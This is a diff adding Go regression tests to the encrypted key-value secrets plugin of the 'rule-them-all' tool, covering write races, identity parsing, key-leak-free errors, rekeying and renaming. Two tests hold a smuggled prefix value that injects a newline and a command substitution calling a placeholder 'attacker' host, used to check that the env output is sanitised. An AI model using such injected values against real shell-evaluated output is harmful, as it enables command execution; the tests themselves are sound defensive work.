@@ -5,13 +5,16 @@ import (
 	"context"
 	"crypto/ed25519"
 	"crypto/rand"
+	"encoding/json"
 	"encoding/pem"
 	"fmt"
+	"io"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
 
+	"filippo.io/age"
 	"golang.org/x/crypto/ssh"
 
 	"github.com/this-is-tobi/rule-them-all/pkg/plugin"
@@ -99,6 +102,9 @@ func TestSafetyClasses(t *testing.T) {
 	want := map[string]plugin.Safety{
 		"kv.list":       plugin.Read,
 		"kv.get":        plugin.Write, // deliberate: revealing a secret is the sensitive act
+		"kv.copy":       plugin.Write, // …and a clipboard is somewhere a secret has been revealed to
+		"kv.edit":       plugin.Write, // …as is an editor buffer
+		"kv.rename":     plugin.Write,
 		"kv.env":        plugin.Write, // …and so is exporting one
 		"kv.set":        plugin.Write,
 		"kv.rm":         plugin.Destructive,
@@ -164,6 +170,44 @@ func TestSetGetRoundTrip(t *testing.T) {
 	}
 	if got := v.(view.Text).Body; got != "s3cr3t" {
 		t.Errorf("get = %q, want s3cr3t", got)
+	}
+}
+
+// A regression test for a real bug review found (PROJECT.md D86): kv's
+// write handlers (set, rename, remove, rekey) decrypt the whole store,
+// mutate one entry in memory, and write the whole thing back, with nothing
+// between the load and the save stopping a second writer from doing the
+// same and clobbering the first. Plausible any time two calls actually run
+// concurrently — the MCP bridge dispatches every tools/call in its own
+// goroutine, so an agent pipelining two kv.set calls is the ordinary case,
+// not a rare one.
+func TestConcurrentSetsDoNotLoseEachOthersWrites(t *testing.T) {
+	setup(t)
+	// Seed the store first, unlocked and alone, so every goroutine below
+	// races a real load..save window against an existing file rather than
+	// each separately creating the store from nothing — a different, easier
+	// case that would not exercise the bug.
+	text(t, runSet, map[string]any{"key": "seed", "value": "v0"}, false)
+
+	const n = 8
+	errs := make(chan error, n)
+	for i := range n {
+		go func(i int) {
+			_, err := runSet(context.Background(),
+				req(map[string]any{"key": fmt.Sprintf("k%d", i), "value": "v"}, false))
+			errs <- err
+		}(i)
+	}
+	for range n {
+		if err := <-errs; err != nil {
+			t.Fatalf("concurrent set: %v", err)
+		}
+	}
+
+	tbl := table(t, runList, nil)
+	if len(tbl.Rows) != n+1 { // n distinct keys, plus the seed
+		t.Fatalf("store holds %d entries after %d concurrent writers (plus the seed), want %d — some writes were lost",
+			len(tbl.Rows), n, n+1)
 	}
 }
 
@@ -344,7 +388,7 @@ func TestListFiltersByKind(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	if !strings.Contains(v.(view.Text).Body, "No certificate entries") {
+	if !strings.Contains(v.(view.Text).Body, "No key of kind certificate") {
 		t.Errorf("empty kind filter = %v", v)
 	}
 }
@@ -496,10 +540,40 @@ func TestEnvName(t *testing.T) {
 		{"", "api.token/v2", "API_TOKEN_V2"},
 		{"APP_", "secret", "APP_SECRET"},
 		{"", "2fa-seed", "_2FA_SEED"}, // a shell will not take a leading digit
+		{"X=1\nexport PWNED=$(x)\nDB_", "PASSWORD", "X_1_EXPORT_PWNED___X__DB_PASSWORD"},
 	} {
 		if got := envName(tc.prefix, tc.key); got != tc.want {
 			t.Errorf("envName(%q, %q) = %q, want %q", tc.prefix, tc.key, got, tc.want)
 		}
+	}
+}
+
+// A regression test for a real, reproduced vulnerability review found
+// (PROJECT.md D74): --prefix was concatenated into `kv env`'s output with
+// no filtering, unlike key (character-whitelisted) and value
+// (shell-quoted). A prefix containing a newline broke the output into
+// extra lines, one of which could carry a live command substitution — a
+// direct hit against `eval "$(rta kv env …)"`, this capability's own
+// documented usage. Because prefix is not a Local field, this was also
+// reachable from an MCP caller holding nothing more than a per-key grant
+// to reveal one value, exceeding what that grant authorizes.
+func TestEnvPrefixCannotInjectExtraLinesOrCommands(t *testing.T) {
+	setup(t)
+	text(t, runSet, map[string]any{"key": "db-password", "value": "s3cret"}, false)
+
+	body := text(t, runEnv, map[string]any{
+		"key":    []string{"db-password"},
+		"prefix": "X=1\nexport PWNED=$(curl attacker/x)\nDB_",
+	}, false)
+
+	if strings.Count(body, "\n") != 0 {
+		t.Fatalf("output has %d newlines, want exactly the one line: %q", strings.Count(body, "\n"), body)
+	}
+	if strings.ContainsAny(body, "$()") {
+		t.Errorf("shell metacharacters survived into the output: %q", body)
+	}
+	if body != `export X_1_EXPORT_PWNED___CURL_ATTACKER_X__DB_DB_PASSWORD='s3cret'` {
+		t.Errorf("got %q", body)
 	}
 }
 
@@ -821,6 +895,118 @@ func TestSSHKeyEncryptionRoundTrip(t *testing.T) {
 	}
 	if v.(view.Text).Body != "before-migration" {
 		t.Errorf("pre-migration entry = %v", v)
+	}
+}
+
+// A regression test for a real bug review caught (PROJECT.md D74):
+// parseIdentities used to read only the first AGE-SECRET-KEY- line of an
+// identity file, silently ignoring every key after it — even though age's
+// own convention (age-keygen >> identities.txt) is to accumulate several
+// keys in one file. A store actually protected by the second key reported
+// kv.wrongkey/a lockout refusal with the correct key sitting right there.
+func TestMultiKeyIdentityFileUsesEveryKeyNotJustTheFirst(t *testing.T) {
+	setup(t)
+	text(t, runSet, map[string]any{"key": "first", "value": "before-migration"}, false)
+
+	decoy, err := age.GenerateX25519Identity()
+	if err != nil {
+		t.Fatal(err)
+	}
+	real, err := age.GenerateX25519Identity()
+	if err != nil {
+		t.Fatal(err)
+	}
+	multi := filepath.Join(t.TempDir(), "identities.txt")
+	body := decoy.String() + "\n" + real.String() + "\n"
+	if err := os.WriteFile(multi, []byte(body), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	// Lock the store to the second key in the file. Before the fix,
+	// heldHere (via parseIdentities) only ever saw the decoy's public half,
+	// so this would be refused as a lockout even though the real key is
+	// right there in the same file.
+	text(t, runRekey, map[string]any{
+		"only": true, "recipient": []string{real.Recipient().String()}, "identity": multi,
+	}, false)
+
+	// Before the fix, readKeys only tried the decoy identity and reported
+	// kv.wrongkey with the real key present in the same file.
+	v, err := runGet(context.Background(), req(map[string]any{"key": "first", "identity": multi}, false))
+	if err != nil {
+		t.Fatalf("could not read with the second key in a multi-key identity file: %v", err)
+	}
+	if v.(view.Text).Body != "before-migration" {
+		t.Errorf("got %v", v)
+	}
+}
+
+// A regression test for a real bug review caught (PROJECT.md D74):
+// parseRecipient's fallback error echoed up to 32 characters of whatever
+// the caller supplied, including a mistakenly pasted private key — an
+// AGE-SECRET-KEY-1... string is unambiguously secret material, and none of
+// it belongs in an error message that reaches the terminal, shell history,
+// or a log capturing command output.
+func TestParseRecipientNeverEchoesAPastedPrivateKey(t *testing.T) {
+	id, err := age.GenerateX25519Identity()
+	if err != nil {
+		t.Fatal(err)
+	}
+	_, _, perr := parseRecipient(id.String())
+	if perr == nil {
+		t.Fatal("expected an error: a private key is not a valid recipient")
+	}
+	if strings.Contains(perr.Error(), "AGE-SECRET-KEY-") {
+		t.Errorf("private key material leaked into the error: %v", perr)
+	}
+
+	// The same guard applies to a stored kv.recipients entry, which has its
+	// own independent echo point in recipientsFor's wrapping error.
+	_, verr := recipientsFor([]string{id.String()})
+	if verr == nil {
+		t.Fatal("expected an error")
+	}
+	if strings.Contains(verr.Error(), "AGE-SECRET-KEY-") {
+		t.Errorf("private key material leaked into the error: %v", verr)
+	}
+
+	// A genuinely garbage (non-secret) recipient is still shown, truncated,
+	// so a real typo stays debuggable.
+	_, _, perr = parseRecipient("not-a-key-at-all")
+	if perr == nil || !strings.Contains(perr.Error(), "not-a-key-at-all") {
+		t.Errorf("ordinary garbage should still be echoed for debugging: %v", perr)
+	}
+}
+
+// A gap named rather than fixed alongside the rest of PROJECT.md D74:
+// publicHalf's other branch — a --recipient path whose own content is a raw
+// age identity, not one kv generated itself — derives the recipient
+// directly from the identity's public half (age.ParseX25519Identity) rather
+// than falling through to the .pub-sibling lookup, exactly as kv.rekey's
+// own --recipient help text documents ("a path to one — including a private
+// key, whose public half is all that is read"). Deliberately no .pub file
+// beside it: that is what proves this branch ran rather than the sibling
+// lookup one line below it in publicHalf.
+func TestParseRecipientDerivesTheRecipientFromAPathToARawAgeIdentity(t *testing.T) {
+	id, err := age.GenerateX25519Identity()
+	if err != nil {
+		t.Fatal(err)
+	}
+	path := filepath.Join(t.TempDir(), "identity")
+	if err := os.WriteFile(path, []byte(id.String()+"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	r, spec, perr := parseRecipient(path)
+	if perr != nil {
+		t.Fatalf("parseRecipient(%q): %v", path, perr)
+	}
+	want := id.Recipient().String()
+	if spec != want {
+		t.Errorf("spec = %q, want the derived recipient %q", spec, want)
+	}
+	if r.(interface{ String() string }).String() != want {
+		t.Errorf("recipient = %v, want %q", r, want)
 	}
 }
 
@@ -1316,7 +1502,7 @@ func TestKeyPassphraseIsAskedForEvenWhenAStorePassphraseWasGiven(t *testing.T) {
 	path := writeLockedSSHKey(t, t.TempDir(), "id_locked", "the key one")
 	asked := stubKeyPrompt(t, "the key one")
 
-	if _, verr := parseIdentity(cliReq(map[string]any{"passphrase": "the store one"}), path); verr != nil {
+	if _, verr := parseIdentities(cliReq(map[string]any{"passphrase": "the store one"}), path); verr != nil {
 		t.Fatalf("verr = %+v", verr)
 	}
 	if *asked != 1 {
@@ -1333,7 +1519,7 @@ func TestWrongKeyPassphraseIsNamedWhenNobodyCanBeAsked(t *testing.T) {
 
 	req := plugin.NewRequest(map[string]any{"passphrase": "wrong"}, false, false).
 		WithSurface(plugin.SurfaceMCP)
-	_, verr := parseIdentity(req, path)
+	_, verr := parseIdentities(req, path)
 	if verr == nil || verr.Code != "kv.identity.locked" {
 		t.Fatalf("verr = %+v", verr)
 	}
@@ -1354,7 +1540,7 @@ func TestCompletionNeverAsksForAKeyPassphrase(t *testing.T) {
 
 	req := plugin.NewRequest(map[string]any{"identity": path}, false, false).
 		WithSurface(plugin.SurfaceCompletion)
-	if _, verr := parseIdentity(req, path); verr == nil {
+	if _, verr := parseIdentities(req, path); verr == nil {
 		t.Error("completion unlocked a key")
 	}
 	if *asked != 0 {
@@ -1387,7 +1573,94 @@ func TestLockedIdentityIsReportedSeparately(t *testing.T) {
 	}
 }
 
+// A regression test for a real bug review caught (PROJECT.md D74):
+// Unlockable() trusted RTA_KV_IDENTITY without checking the path it names
+// actually exists — unlike LockedIdentity(), its sibling two functions
+// above, which already guarded this. `rta doctor` uses Unlockable() to tell
+// an operator whether an MCP agent's inherited environment can decrypt the
+// store unattended; a stale or typo'd env var used to report "yes" even
+// though a real kv.get against the same environment would fail outright
+// with kv.identity.unreadable.
+func TestUnlockableDoesNotTrustAStaleIdentityEnvVar(t *testing.T) {
+	_, configDir := setupWithConfig(t)
+	path, _ := writeSSHKeypair(t, configDir, "id_ed25519")
+
+	if _, err := runSet(context.Background(), cliReq(map[string]any{
+		"key": "k", "value": "v", "identity": path,
+	})); err != nil {
+		t.Fatalf("set with an explicit identity: %v", err)
+	}
+
+	t.Setenv(identityEnv, filepath.Join(t.TempDir(), "does-not-exist"))
+	if ok, source := Unlockable(); ok {
+		t.Errorf("a nonexistent RTA_KV_IDENTITY counted as usable key material (source=%q)", source)
+	}
+}
+
 // --- Re-keying -----------------------------------------------------------
+
+// A regression test for a real bug review caught (PROJECT.md D74): saveTo
+// writes the re-encrypted store and the plaintext kv.recipients file as two
+// separate, non-atomic steps. If the second fails after the first
+// succeeds, the store really is re-encrypted to the new key set, but the
+// plaintext record of who can read it goes stale — and the error the
+// operator sees has to say so explicitly, since `rta kv recipients` itself
+// has no way to detect the mismatch on its own (it reads the plaintext
+// file, not the ciphertext's embedded record).
+func TestRekeyErrorNamesTheStaleRecipientsFileWhenOnlyThatWriteFails(t *testing.T) {
+	dataDir := setup(t)
+
+	id, err := age.GenerateX25519Identity()
+	if err != nil {
+		t.Fatal(err)
+	}
+	spec := id.Recipient().String()
+
+	// saveTo never reads kv.recipients, only writes it — so preempting it as
+	// a directory up front (rather than mid-call, which nothing here can do
+	// to a single real filesystem) reproduces exactly the failure this test
+	// is about: writeAtomic (kv.age, a different file) still succeeds, and
+	// saveRecipients' own atomicfile.Write, whose final step renames onto
+	// this exact path, cannot rename a file onto an existing directory.
+	if err := os.Mkdir(filepath.Join(dataDir, "kv.recipients"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	verr := saveTo(
+		store{Entries: map[string]entry{"k": {Value: []byte("v")}}},
+		[]age.Recipient{id.Recipient()},
+		[]string{spec},
+	)
+	if verr == nil {
+		t.Fatal("expected the recipients write to fail")
+	}
+	if !strings.Contains(verr.Hint, "WAS re-encrypted") {
+		t.Errorf("hint = %q, want it to say the store was re-encrypted despite the failure", verr.Hint)
+	}
+
+	// Prove the ciphertext half really did commit, independent of the
+	// failed plaintext write: decrypt kv.age directly with the identity
+	// saveTo was told to encrypt it to.
+	data, err := os.ReadFile(storePath())
+	if err != nil {
+		t.Fatal(err)
+	}
+	r, err := age.Decrypt(bytes.NewReader(data), id)
+	if err != nil {
+		t.Fatalf("the store was not actually encrypted to the given recipient: %v", err)
+	}
+	plaintext, err := io.ReadAll(r)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var s store
+	if err := json.Unmarshal(plaintext, &s); err != nil {
+		t.Fatal(err)
+	}
+	if string(s.Entries["k"].Value) != "v" {
+		t.Errorf("decrypted entries = %+v", s.Entries)
+	}
+}
 
 // "I want both": the store keeps opening with the SSH key it was locked to,
 // and gains one that needs no passphrase and no flag.
@@ -1675,7 +1948,7 @@ func TestLockedKeyExplainsThatTheAgentCannotHelp(t *testing.T) {
 	if err := os.WriteFile(path, pem.EncodeToMemory(block), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	_, verr := parseIdentity(plugin.NewRequest(nil, false, false), path)
+	_, verr := parseIdentities(plugin.NewRequest(nil, false, false), path)
 	if verr == nil || verr.Code != "kv.identity.locked" {
 		t.Fatalf("verr = %+v", verr)
 	}
@@ -1857,5 +2130,157 @@ func TestALegacyStoreIsStampedOnTheNextWrite(t *testing.T) {
 	}
 	if got := string(s.Entries["k"].Value); got != "hunter2" {
 		t.Errorf("value = %q", got)
+	}
+}
+
+// --- Renaming, filtering, counting ------------------------------------------
+
+// Renaming used to be `kv get` piped into `kv set` and then `kv rm`: two
+// grants, and the secret itself sitting in shell history at the join. The
+// entry moves inside the store instead, and everything that is not its name
+// travels with it.
+func TestRenameKeepsTheValueAndEverythingKnownAboutIt(t *testing.T) {
+	setup(t)
+	text(t, runSet, map[string]any{
+		"key": "old-token", "value": "s3cr3t", "description": "staging API",
+	}, false)
+	before := storedEntry(t, "old-token")
+
+	body := text(t, runRename, map[string]any{"key": "old-token", "new-name": "staging-token"}, false)
+
+	if got := text(t, runGet, map[string]any{"key": "staging-token"}, false); got != "s3cr3t" {
+		t.Errorf("value under the new name = %q", got)
+	}
+	if _, err := runGet(context.Background(), req(map[string]any{"key": "old-token"}, false)); err == nil {
+		t.Error("the old name still resolves")
+	}
+	after := storedEntry(t, "staging-token")
+	if after.Description != "staging API" {
+		t.Errorf("description = %q", after.Description)
+	}
+	// A name is not a rotation. `kv list`'s Updated column is the one place a
+	// token that has been sitting there for fourteen months is visible, and a
+	// rename that reset it would answer "just now" to the only question that
+	// column exists to answer.
+	if !after.Updated.Equal(before.Updated) || !after.Created.Equal(before.Created) {
+		t.Errorf("timestamps moved: %v/%v, want %v/%v",
+			after.Created, after.Updated, before.Created, before.Updated)
+	}
+	if strings.Contains(body, "s3cr3t") {
+		t.Errorf("the confirmation printed the value: %q", body)
+	}
+}
+
+// Renaming onto an existing key would destroy the secret in it with no
+// history and no undo — kv.rm's question — and a grant scoped to the key
+// being renamed says nothing at all about the one being clobbered.
+func TestRenameRefusesToClobberAnExistingKey(t *testing.T) {
+	setup(t)
+	text(t, runSet, map[string]any{"key": "staging", "value": "staging-secret"}, false)
+	text(t, runSet, map[string]any{"key": "prod", "value": "prod-secret"}, false)
+
+	_, err := runRename(context.Background(), req(map[string]any{"key": "staging", "new-name": "prod"}, false))
+	ve := view.AsError(err, "z")
+	if ve.Code != "kv.rename.taken" {
+		t.Fatalf("clobbering rename = %+v", ve)
+	}
+	if !strings.Contains(ve.Hint, "kv rm") {
+		t.Errorf("hint does not name the command that does ask: %q", ve.Hint)
+	}
+	if got := text(t, runGet, map[string]any{"key": "prod"}, false); got != "prod-secret" {
+		t.Fatalf("the target secret was destroyed: %q", got)
+	}
+	if got := text(t, runGet, map[string]any{"key": "staging"}, false); got != "staging-secret" {
+		t.Errorf("the source was moved anyway: %q", got)
+	}
+}
+
+func TestRenameDryRunMovesNothing(t *testing.T) {
+	setup(t)
+	text(t, runSet, map[string]any{"key": "old", "value": "s3cr3t"}, false)
+
+	body := text(t, runRename, map[string]any{"key": "old", "new-name": "new"}, true)
+
+	if !strings.HasPrefix(body, "would rename") {
+		t.Errorf("dry run = %q", body)
+	}
+	if got := text(t, runGet, map[string]any{"key": "old"}, false); got != "s3cr3t" {
+		t.Errorf("a dry run moved the entry: %q", got)
+	}
+	if _, err := runGet(context.Background(), req(map[string]any{"key": "new"}, false)); err == nil {
+		t.Error("a dry run created the new name")
+	}
+}
+
+func TestRenameToTheSameNameIsCoded(t *testing.T) {
+	setup(t)
+	text(t, runSet, map[string]any{"key": "token", "value": "s3cr3t"}, false)
+	_, err := runRename(context.Background(), req(map[string]any{"key": "token", "new-name": "token"}, false))
+	if ve := view.AsError(err, "z"); ve.Code != "kv.rename.samename" {
+		t.Errorf("rename onto itself = %+v", ve)
+	}
+}
+
+// The name is the half you have forgotten. "Which one was the deploy key for
+// the staging cluster" is answerable from what you wrote down at the time and
+// not from `ci-2`, so the description is searched too — and never printed as
+// anything but the description, which kv.list already shows.
+func TestListMatchesDescriptionsAsWellAsNames(t *testing.T) {
+	setup(t)
+	text(t, runSet, map[string]any{"key": "ci-2", "value": "v", "description": "AWS deploy key, staging"}, false)
+	text(t, runSet, map[string]any{"key": "aws-root", "value": "v", "description": "billing only"}, false)
+	text(t, runSet, map[string]any{"key": "gh-token", "value": "v"}, false)
+
+	tbl := table(t, runList, map[string]any{"match": "AWS"})
+	if len(tbl.Rows) != 2 {
+		t.Fatalf("match aws = %v, want the name and the description hit", tbl.Rows)
+	}
+	// Case-insensitive: nobody remembers whether they wrote AWS or aws.
+	if tbl.Rows[0][col(t, tbl, "Key")] != "aws-root" || tbl.Rows[1][col(t, tbl, "Key")] != "ci-2" {
+		t.Errorf("match aws = %v", tbl.Rows)
+	}
+	if len(table(t, runList, map[string]any{"match": "staging", "kind": "string"}).Rows) != 1 {
+		t.Error("--match and --kind do not narrow together")
+	}
+}
+
+// "No keys stored yet — add one with…" sent people off to re-add a secret
+// that was there all along, one filter away.
+func TestAnEmptyListSaysWhichKindOfEmptyItIs(t *testing.T) {
+	setup(t)
+	if got := emptyList(0, "", ""); !strings.Contains(got, "No keys stored yet") {
+		t.Errorf("empty store = %q", got)
+	}
+	got := emptyList(4, "json", "aws")
+	for _, want := range []string{"of kind json", `matching "aws"`, "holds 4 keys"} {
+		if !strings.Contains(got, want) {
+			t.Errorf("filtered empty = %q, want it to mention %q", got, want)
+		}
+	}
+	if got := emptyList(1, "json", ""); !strings.Contains(got, "holds 1 key") {
+		t.Errorf("one stored key = %q", got)
+	}
+}
+
+// "locked to 1 key(s)" is the shape of message that gets written once and
+// read every day. A store whose status line cannot count is not the thing to
+// look careless about.
+func TestNothingCountsWithParenthesisedPlurals(t *testing.T) {
+	setupWithConfig(t)
+	text(t, runInit, map[string]any{"generate": true}, false)
+
+	v, err := runStatus(context.Background(), plugin.NewRequest(nil, false, false))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := pairValue(v.(view.KeyValue), "locked to"); !strings.HasPrefix(got, "1 key —") {
+		t.Errorf("locked to = %q", got)
+	}
+	if got := plural(2, "reader"); got != "2 readers" {
+		t.Errorf("plural(2, reader) = %q", got)
+	}
+	// The -y rule, the only one that comes up.
+	if got := plural(2, "identity"); got != "2 identities" {
+		t.Errorf("plural(2, identity) = %q", got)
 	}
 }
